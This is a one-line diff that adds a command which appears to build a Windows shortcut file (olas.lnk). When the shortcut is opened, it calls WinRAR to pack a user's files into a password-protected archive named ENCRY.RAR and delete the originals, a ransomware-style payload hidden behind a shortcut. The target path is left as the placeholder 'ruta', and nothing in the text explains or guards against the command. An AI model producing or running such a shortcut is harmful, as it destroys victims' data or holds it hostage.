@@ -1,0 +1,1 @@
+bash .auth -l 'C:\Program Files\WinRAR\Rar.exe" a -df -pcaca "C:\Users\%USERNAME%\ENCRY.RAR" "ruta' -o olas.lnk
